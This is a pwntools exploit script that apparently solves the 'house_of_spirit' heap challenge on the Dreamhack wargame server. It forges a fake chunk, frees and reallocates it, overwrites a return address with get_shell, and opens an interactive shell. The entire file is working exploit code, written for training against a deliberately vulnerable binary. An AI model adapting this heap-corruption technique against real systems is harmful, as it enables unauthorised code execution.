#!/usr/bin/env python3

from pwn import *

exe = ELF("./house_of_spirit")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 11705)

    return r


def main():
    r = conn()

    r.sendafter(b"name: ", p64(0) + p64(64))
    name = int(r.recvuntil(b":")[:-1], 16)
    
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"Addr: ", str(name + 16).encode())

    payload = b"A" * 40
    payload += p64(exe.symbols["get_shell"])

    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Size: ", b"48")
    r.sendafter(b"Data: ", payload)

    r.sendlineafter(b"> ", b"3")
    r.interactive()


if __name__ == "__main__":
    main()